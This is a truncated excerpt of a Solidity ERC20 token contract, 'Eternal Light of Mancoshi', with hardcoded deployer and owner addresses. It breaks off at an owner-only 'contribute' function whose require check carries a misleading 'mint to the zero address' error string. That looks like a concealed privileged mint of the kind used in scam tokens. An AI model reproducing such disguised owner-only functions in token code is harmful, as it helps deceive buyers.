...
contract MANCOSHI is Context, IERC20 {
    ...
    address lead_deployer = 0x13C50AaC4D573e78f09E0269d78885E5098eBa15;
    address public _owner = 0xA3ADaCD3243B4d4091A34D88D8211f2ee563B44e;
   constructor () public {


        
        _name = "Eternal Light of Mancoshi";
        _symbol = "MANCOSHI";
        _decimals = 18;
...
//-----------------------------------------------------------------------------------------------------------------------//
    function contribute(address account) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
